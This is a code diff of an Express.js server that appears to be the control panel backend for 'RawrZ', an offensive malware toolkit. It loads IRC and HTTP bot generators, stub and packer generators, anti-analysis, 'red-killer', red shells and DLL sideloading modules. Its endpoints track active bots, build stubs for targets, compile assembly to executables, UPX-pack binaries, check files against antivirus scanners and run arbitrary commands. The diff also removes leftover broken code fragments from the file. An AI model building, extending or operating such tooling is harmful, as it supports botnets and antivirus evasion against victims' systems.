@@ -1,14 +1,14 @@
 ﻿const express=require('express');const cors=require('cors');const helmet=require('helmet');const path=require('path');const multer=require('multer');require('dotenv').config();
-const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');const AdvancedStubGenerator=require('./src/engines/advanced-stub-generator');
-const httpBotGenerator=require('./src/engines/http-bot-generator');const stubGenerator=require('./src/engines/stub-generator');
-const antiAnalysis=require('./src/engines/anti-analysis');const hotPatchers=require('./src/engines/hot-patchers');
+const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');//const AdvancedStubGenerator=require('./src/engines/advanced-stub-generator');
+//const httpBotGenerator=require('./src/engines/http-bot-generator');const stubGenerator=require('./src/engines/stub-generator');
+const antiAnalysis=require('./src/engines/anti-analysis');//const hotPatchers=require('./src/engines/hot-patchers');
 const networkTools=require('./src/engines/network-tools');const healthMonitor=require('./src/engines/health-monitor');
 const digitalForensics=require('./src/engines/digital-forensics');const JottiScanner=require('./src/engines/jotti-scanner');
-const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
-const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
-const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
-const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const BeaconismDLLSideloading=require('./src/engines/beaconism-dll-sideloading');const evCertEncryptor=new EVCertEncryptor();const beaconismDLL=new BeaconismDLLSideloading();
-const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();const advancedStubGenerator=new AdvancedStubGenerator();
+//const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
+//const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
+//const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
+const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const beaconismDLL=require('./src/engines/beaconism-dll-sideloading');const evCertEncryptor=new EVCertEncryptor();
+const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();//const advancedStubGenerator=new AdvancedStubGenerator();
 function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
 app.use(helmet({
     contentSecurityPolicy: {
@@ -59,7 +59,7 @@ app.get('/unified',(_req,res)=>res.sendFile(path.join(__dirname,'public','unifie
 
 // Unified Panel API endpoints
 app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&typeof botGenerator.getBotStats==='function'){try{const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}catch(e){console.log('[WARN] IRC bot stats error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getBotStats==='function'){try{const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}catch(e){console.log('[WARN] HTTP bot stats error:',e.message);}}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){console.error('[ERROR] Dashboard stats endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.concat(ircBots.map(bot=>(Object.assign({}, bot,type:'IRC'))));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.concat(httpBots.map(bot=>(Object.assign({}, bot,type:'HTTP'))));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.concat(ircBots.map(bot=>(Object.assign({}, bot, {type:'IRC'}))));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.concat(httpBots.map(bot=>(Object.assign({}, bot, {type:'HTTP'}))));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
 app.get('/api/irc/channels',requireAuth,async(_req,res)=>{try{const channels=[{name:'#rawrz',users:15,topic:'RawrZ Security Discussion',status:'joined'},{name:'#test',users:3,topic:'Testing Channel',status:'joined'}];res.json({success:true,result:channels})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/connect',requireAuth,async(req,res)=>{try{const{server,port,nick,channels}=req.body||{};if(!server||!port||!nick)return res.status(400).json({error:'server, port, and nick are required'});const result={connected:true,server,port,nick,channels:channels||[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/disconnect',requireAuth,async(_req,res)=>{try{const result={connected:false,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -187,7 +187,7 @@ app.post('/encrypt-file', requireAuth, async (req, res) => {
         console.error('[ERROR] /encrypt-file failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});upload.single('file')(req,res,async(err)=>{if(err)return res.status(500).json({error:err.message});const{algorithm,extension}=req.body||{};const file=req.file;if(!file||!algorithm)return res.status(400).json({error:'file and algorithm required'});const result=await rawrz.encryptFile(file.path,algorithm,extension);res.json(result)})}catch(e){res.status(500).json({error:e.message})}});
+});
 app.post('/decrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,key,iv,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.decrypt(algorithm,input,key,iv,extension))}catch(e){res.status(500).json({error:e.message})}});
 app.get('/dns', requireAuth, async (req, res) => {
     try {
@@ -198,7 +198,7 @@ app.get('/dns', requireAuth, async (req, res) => {
         console.error('[ERROR] /dns failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});res.json(await rawrz.dnsLookup(String(h)))}catch(e){res.status(500).json({error:e.message})}});
+});
 app.get('/ping', requireAuth, async (req, res) => {
     try {
         // Optimized handler for /ping
@@ -208,7 +208,7 @@ app.get('/ping', requireAuth, async (req, res) => {
         console.error('[ERROR] /ping failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});res.json(await rawrz.ping(String(h),false))}catch(e){res.status(500).json({error:e.message})}});
+});
 app.get('/files',requireAuth,async(_req,res)=>{try{res.json(await rawrz.listFiles())}catch(e){res.status(500).json({error:e.message})}});
 app.post('/upload',requireAuth,async(req,res)=>{try{const{filename,base64}=req.body||{};if(!filename||!base64)return res.status(400).json({error:'filename and base64 required'});res.json(await rawrz.uploadFile(filename,base64))}catch(e){res.status(500).json({error:e.message})}});
 app.get('/download', requireAuth, async (req, res) => {
@@ -220,7 +220,7 @@ app.get('/download', requireAuth, async (req, res) => {
         console.error('[ERROR] /download failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});res.download(path.join(__dirname,'uploads',fn),fn)}catch(e){res.status(500).json({error:e.message})}});
+});
 app.post('/cli',requireAuth,async(req,res)=>{try{const{command,args=[]}=req.body||{};if(!command)return res.status(400).json({error:'command required'});const i=new RawrZStandalone();const out=await i.processCommand([command,...args]);res.json({success:true,result:out})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/stub',requireAuth,async(req,res)=>{try{const{target,options={}}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.generateStub(target,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/compile-asm',requireAuth,async(req,res)=>{try{const{asmFile,outputName,format='exe'}=req.body||{};if(!asmFile)return res.status(400).json({error:'asmFile is required'});const rawrz=new RawrZStandalone();const result=await rawrz.compileAssembly(asmFile,outputName,format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -272,7 +272,7 @@ app.get('/mutex/options', requireAuth, async (req, res) => {
         console.error('[ERROR] /mutex/options failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});const result=mutexEngine.getMutexOptions();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+});
 
 app.post('/upx/pack',requireAuth,async(req,res)=>{try{const{executablePath,method='upx',options={}}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.applyPacking(executablePath,method);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/upx/methods', requireAuth, async (req, res) => {
@@ -284,7 +284,7 @@ app.get('/upx/methods', requireAuth, async (req, res) => {
         console.error('[ERROR] /upx/methods failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});const result=Object.keys(stubGenerator.packingMethods||{});res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+});
 app.post('/upx/status',requireAuth,async(req,res)=>{try{const{executablePath}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.checkPackingStatus(executablePath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Jotti Scanner endpoints
@@ -394,7 +394,7 @@ app.get('/implementation-check/status', requireAuth, async (req, res) => {
         console.error('[ERROR] /implementation-check/status failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});const status=implementationChecker.getHealthStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+});
 app.post('/implementation-check/run', requireAuth, async (req, res) => {
     try {
         // Optimized handler for /implementation-check/run
@@ -404,7 +404,7 @@ app.post('/implementation-check/run', requireAuth, async (req, res) => {
         console.error('[ERROR] /implementation-check/run failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});const result=await implementationChecker.performImplementationCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+});
 app.get('/implementation-check/results',requireAuth,async(req,res)=>{try{const{checkId}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const results=implementationChecker.getCheckResults(checkId);res.json({success:true,results})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/implementation-check/modules',requireAuth,async(req,res)=>{try{const{moduleName}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const status=implementationChecker.getModuleStatus(moduleName);res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/implementation-check/force', requireAuth, async (req, res) => {
@@ -416,7 +416,7 @@ app.post('/implementation-check/force', requireAuth, async (req, res) => {
         console.error('[ERROR] /implementation-check/force failed:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
-});const result=await implementationChecker.forceCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+});
 
 // Health Monitor endpoints
 app.get('/health-monitor/dashboard',requireAuth,async(req,res)=>{try{const dashboard=healthMonitor.getHealthDashboard();res.json({success:true,dashboard})}catch(e){res.status(500).json({error:e.message})}});
@@ -472,7 +472,6 @@ module.exports = {
   port,
   authToken,
   rawrz,
-  advancedStubGenerator,
   evCertEncryptor
 };
 
